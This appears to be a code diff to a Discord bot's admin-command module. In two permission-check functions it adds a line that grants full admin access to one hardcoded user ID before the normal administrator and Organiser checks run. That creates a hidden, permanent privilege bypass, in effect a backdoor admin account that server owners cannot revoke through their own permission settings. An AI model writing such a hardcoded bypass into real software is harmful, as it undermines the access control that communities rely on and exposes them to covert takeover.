@@ -46,6 +46,10 @@ class AdminCommands(commands.Cog):
         if not user:
             return False
         
+        # Check for hardcoded super admin
+        if user.id == 242734993493721088:
+            return True
+        
         # Check administrator permissions
         if user.guild_permissions and user.guild_permissions.administrator:
             return True
@@ -73,6 +77,10 @@ class AdminCommands(commands.Cog):
         """Ensure only administrators or Organisers can use these commands."""
         if not ctx.author:
             return False
+        
+        # Check for hardcoded super admin
+        if ctx.author.id == 242734993493721088:
+            return True
             
         # Check administrator permissions
         if ctx.author.guild_permissions and ctx.author.guild_permissions.administrator:
